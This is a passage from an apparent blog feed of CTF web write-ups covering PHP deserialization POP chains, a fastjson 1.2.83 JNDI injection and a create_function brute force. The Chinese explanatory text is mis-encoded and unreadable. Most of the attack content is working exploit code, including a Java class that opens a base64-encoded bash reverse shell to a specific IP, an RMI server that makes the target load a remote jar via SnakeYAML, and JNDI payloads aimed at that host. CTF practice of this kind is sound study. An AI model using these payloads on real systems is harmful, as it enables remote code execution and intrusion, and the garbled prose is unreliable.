class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c1-&gt;hint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;y1 = new bei();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;b2 = new yang();</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> yang();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> cheng();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> bei();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;c1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;b1 = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flagåœ¨phpinfoé‡Œ</p>
<p><img src="https://img-blog.csdnimg.cn/807ee7def3754c8fbafc1dcbb5f5d26e.png" alt="img"></p>
<h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Test/&quot;</span>,get_class(<span class="keyword">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$fun</span> = <span class="keyword">new</span> Fun();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$fun</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">55410055464485123619498041307525</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="simple-json"><a href="#simple-json" class="headerlink" title="simple_json"></a>simple_json</h3><p>fastjson1.2.83</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™çš„ç±»ä¼¼çš„payloadï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;ldap://ip:port/Exp&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å„ç§ä¿¡æ¯æœé›†ä¹‹åï¼š</p>
<p>æ²¡æœ‰ELProcessorçš„æ—¶å€™ï¼š <a href="https://tttang.com/archive/1405/#toc_snakeyaml">https://tttang.com/archive/1405/#toc_snakeyaml</a></p>
<p>Yamlååºåˆ—åŒ–ï¼š <a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/rgwdc7#wpl31">https://www.yuque.com/jinjinshigekeaigui/qskpi5/rgwdc7#wpl31</a></p>
<p>ç”±æ­¤å…ˆåˆ›å»ºä¸€ä¸ªExpæ¶æ„ç±»ï¼Œç”¨äºRCEï¼Œè¿˜æœ‰<code>META-INF/services/javax.script.ScriptEngineFactory</code> æ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>Exp</code> ï¼Œç„¶åç¼–è¯‘Expç±»ï¼Œç”ŸæˆjaråŒ…ä¸€èµ·æ”¾åˆ°vpsä¸Š</p>
<p><img src="https://img-blog.csdnimg.cn/63fd87881030485f9908399906171c88.png" alt="Untitled"></p>
<p>ç”¨pythonå¼€å¯æœåŠ¡ï¼š</p>
<blockquote>
<p>python3 -m http.server â€“bind 0.0.0.0 8888</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hacked by ameuu&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getMimeTypes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getNames</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getParameter</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOutputStatement</span><span class="params">(String toDisplay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProgram</span><span class="params">(String... statements)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ScriptEngine <span class="title">getScriptEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°å¼€å¯rmiæœåŠ¡ï¼Œjaræ‰“åŒ…ï¼Œæ”¾åˆ°vpsä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title">tomcat_snakeyaml</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        String yaml = <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\&quot;</span>&lt;http:<span class="comment">//82.156.2.166:8888/exp.jar\\&quot;]]]]&quot;&gt;;</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=load&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;a&quot;</span>, yaml));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rmi_port = <span class="number">1559</span>;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;82.156.2.166&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(rmi_port);</span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ResourceRef ref = tomcat_snakeyaml();</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¼ å…¥payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;ldap://82.156.2.166:1559/Exploit&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœ‰æˆåŠŸè¿ä¸Šï¼Œåˆ©ç”¨åˆ«çš„å¸ˆå‚…å†™çš„<a href="https://github.com/huy4ng/JNDI-Injection-Bypass">å·¥å…·</a>ï¼ŒæŠŠyamlå‡½æ•°å†™å…¥å·¥å…·ä¹‹åæ‰“åŒ…ï¼Œ</p>
<blockquote>
<p>java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer 82.156.2.166</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/6551b934b4f049be8b0589fde5654f6b.png" alt="Untitled"></p>
<p>è®°å¾—ç›‘å¬ç«¯å£</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;content&quot;</span> : &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ycb.simple_json.service.JNDIService&quot;</span>, <span class="attr">&quot;target&quot;</span>:<span class="string">&quot;rmi://82.156.2.166:1097/ExecBySnakeYaml&quot;</span>&#125;, <span class="attr">&quot;msg&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$.content.context&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/b7290ffa38894a769b45660e2143d3ec.png" alt="Untitled"></p>
<blockquote>
<p>little_dbåœ¨å¤ç°ä¸­â€¦â€¦</p>
</blockquote>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¾ŠåŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬ä¸€å‘¨å­¦ä¹ </title>
    <url>/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="SUCTF-annonymous"><a href="#SUCTF-annonymous" class="headerlink" title="[SUCTF]annonymous"></a>[SUCTF]annonymous</h4><ul>
<li>create_function</li>
</ul>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>0x01:å®¡è®¡</strong></p>
<p>é¦–å…ˆåˆ©ç”¨<code>creat_function</code>åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè€Œevalå‡½æ•°ä¸­ä¹Ÿå®ç°äº†å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨ï¼Œä½†æ˜¯evalä¸­åˆ›å»ºçš„å‡½æ•°åç”¨äº†<code>openssl_random_pseudo_bytes</code>å‡½æ•°ï¼Œæ‰€ä»¥å¾ˆéš¾è¿›è¡Œçˆ†ç ´</p>
<p>ä½†æ˜¯å¯ä»¥ä»åŒ¿åå‡½æ•°å…¥æ‰‹ï¼Œå› ä¸ºcreate_functionåˆ›å»ºåŒ¿åå‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°çš„åå­—ä¼šé»˜è®¤ä¸º<code>%00lambda_%d</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´åé¢çš„<code>%d</code>æ‰§è¡Œå¯¹åº”çš„åŒ¿åå‡½æ•°</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3f157adf-697c-4764-b2cc-994d24033869.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;$flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;go! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<span id="more"></span>

<h4 id="DDCTF-homebrew-event-loop"><a href="#DDCTF-homebrew-event-loop" class="headerlink" title="[DDCTF]homebrew event loop"></a>[DDCTF]homebrew event loop</h4><ul>
<li>pythonä»£ç å®¡è®¡</li>
</ul>
